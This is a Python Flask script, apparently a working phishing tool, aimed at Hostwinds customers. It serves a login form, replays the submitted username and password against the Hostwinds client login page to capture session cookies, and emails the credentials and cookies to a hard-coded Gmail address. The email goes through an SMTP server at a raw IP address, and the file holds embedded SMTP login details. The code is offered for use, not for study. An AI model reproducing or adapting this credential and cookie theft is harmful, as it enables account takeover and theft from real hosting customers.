import smtplib
import requests
from flask import Flask, request, render_template_string
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json

# Flask setup
app = Flask(__name__)

# SMTP server details
SMTP_SERVER = '146.19.254.243'  # Replace with your SMTP server
SMTP_PORT = 6040  # Non-SSL port
SMTP_USER = 'auto528@cryptasphere.bio'  # Your email
SMTP_USERR = 'auto528'
SMTP_PASSWORD = 'vip7a81be0e2b36'  # Your email password
TO_EMAIL = 'danielnewwoj@gmail.com'  # Email where you want to send the information

# Hostwinds login URL
LOGIN_URL = 'https://clients.hostwinds.com/dologin.php'  # Replace with actual login URL

# HTML form for login (you can customize this form as needed)
HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Form</title>
</head>
<body>
    <h2>Login Form</h2>
    <form action="/submit" method="POST">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

# Route to display the form
@app.route('/')
def form():
    return render_template_string(HTML_FORM)

# Route to handle form submission and send email
@app.route('/submit', methods=['POST'])
def submit():
    # Capture form data
    username = request.form.get('username')
    password = request.form.get('password')

    # Prepare data for POST request (Hostwinds login)
    login_data = {
        'username': username,
        'password': password,
        'login': 'Login'  # Check the actual name of the login button if needed
    }

    # Create a session to capture cookies
    session = requests.Session()

    # Send POST request to Hostwinds login
    try:
        response = session.post(LOGIN_URL, data=login_data)
        
        # Check if login is successful (you may need to inspect the response)
        if response.status_code == 200 and "Dashboard" in response.text:
            cookies = session.cookies.get_dict()  # Capture session cookies
        else:
            return "Login failed, please check your credentials."

    except Exception as e:
        return f"Error during login request: {str(e)}"

    # Compose the email with form data and cookies
    message = MIMEMultipart()
    message['From'] = SMTP_USER
    message['To'] = TO_EMAIL
    message['Subject'] = 'Login Information and Cookies'

    # Email body containing the login data and cookies
    body = f"""
    Username: {username}
    Password: {password}

    Cookies: 
    {json.dumps(cookies, indent=2)}  # Sending the cookies as formatted JSON
    """
    message.attach(MIMEText(body, 'plain'))

    # Sending the email via SMTP on port 6040 (no SSL)
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            # Login to SMTP server (no SSL)
            server.login(SMTP_USERR, SMTP_PASSWORD)
            server.sendmail(SMTP_USER, TO_EMAIL, message.as_string())  # Send the email
            return "Form submitted and email sent successfully!"
    except Exception as e:
        return f"Error sending email: {str(e)}"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
